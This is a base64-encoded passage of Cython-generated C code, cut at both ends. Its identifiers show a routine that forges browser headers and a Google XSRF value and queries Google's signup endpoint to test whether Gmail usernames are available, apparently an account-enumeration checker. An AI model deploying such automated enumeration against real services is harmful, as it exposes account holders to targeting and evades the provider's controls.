NlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTgzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICAjZW5kaWYKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgfSBlbHNlIHsKICAgICAgICBQeV9zc2l6ZV90IGluZGV4ID0gLTE7CiAgICAgICAgX19weXhfdF8xMCA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fcHl4X3RfMTcgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEwKTsKICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfNSA9IF9fcHl4X3RfMTcoX19weXhfdF8xMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MMjRfdW5wYWNraW5nX2ZhaWxlZDsKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfOCA9IF9fcHl4X3RfMTcoX19weXhfdF8xMCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgZ290byBfX3B5eF9MMjRfdW5wYWNraW5nX2ZhaWxlZDsKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICBpZiAoX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhfX3B5eF90XzE3KF9fcHl4X3RfMTApLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8xNyA9IE5VTEw7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wyNV91bnBhY2tpbmdfZG9uZTsKICAgICAgICBfX3B5eF9MMjRfdW5wYWNraW5nX2ZhaWxlZDo7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX3B5eF90XzE3ID0gTlVMTDsKICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7CiAgICAgICAgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfTDI1X3VucGFja2luZ19kb25lOjsKICAgICAgfQogICAgICBfX3B5eF92X3RsID0gX19weXhfdF81OwogICAgICBfX3B5eF90XzUgPSAwOwogICAgICBfX3B5eF92X2hvc3QgPSBfX3B5eF90Xzg7CiAgICAgIF9fcHl4X3RfOCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxODQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Ib3N0X0dBUFMsIF9fcHl4X3ZfaG9zdCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2Nvb2tpZXMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hdXRob3JpdHlfaGVhZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2dsZV9hY2NvdW50c19kb21haW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfdF81LCBfX3B5eF90XzEwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuX1VTX2VuX3FfMF85KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb250ZW50X3R5cGVfaGVhZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxODksIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29udGVudF90eXBlX2Zvcm1fYWx0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X3RfNSwgX19weXhfdF84KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nb29nbGVfYWNjb3VudHNfeHNyZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbl9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTkxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9EaWN0X0dldEl0ZW0oX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ29vZ2xlX2FjY291bnRzX3VybCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF90XzUsIF9fcHl4X3RfMTApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcnJlcl9oZWFkZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxOTIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDE5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIsIF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxOTIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfdF81LCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTkzLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VyX2FnZW50X2hlYWRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE5MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgX19weXhfdF8xMCA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDE5MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICBfX3B5eF90XzcgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzkpKSkgewogICAgICAgIF9fcHl4X3RfMTAgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzkpOwogICAgICAgIGFzc2VydChfX3B5eF90XzEwKTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF85LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgTlVMTH07CiAgICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgxLV9fcHl4X3RfNykgfCAoX19weXhfdF83Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE5MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIH0KICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfdF81LCBfX3B5eF90XzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTk1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UTCwgX19weXhfdl90bCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X3BhcmFtcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNiA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfdGwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfZW1haWwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxOTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF8xOFswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGludWVfaHR0cHNfM0FfMkZfMkZtYWlsX2dvb2c7CiAgICAgIF9fcHl4X3RfMThbMV0gPSBfX3B5eF90XzY7CiAgICAgIF9fcHl4X3RfMThbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIyXzJDXzIyOwogICAgICBfX3B5eF90XzE4WzNdID0gX19weXhfdF84OwogICAgICBfX3B5eF90XzE4WzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yMl8yQzBfMkMwXzJDMV8yQ251bGxfMkMwXzJDNTE2OwoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTgsIDUsIDExOSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyA5ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF84KSArIDM2MCwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF84KSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE5NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF84ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2dsZV9hY2NvdW50c191cmwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjAyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAyMDIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zaWdudXBfdXNlcm5hbWVhdmFpbGFiaWxpdHkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjAyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzcgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgICAgIF9fcHl4X3RfOCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfOCk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gNCA6IDApXSA9IHtfX3B5eF90XzgsIF9fcHl4X3RfMTB9OwogICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF92X3BhcmFtcywgX19weXhfdF85LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIwMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfdl9jb29raWVzLCBfX3B5eF90XzksIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjAyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3R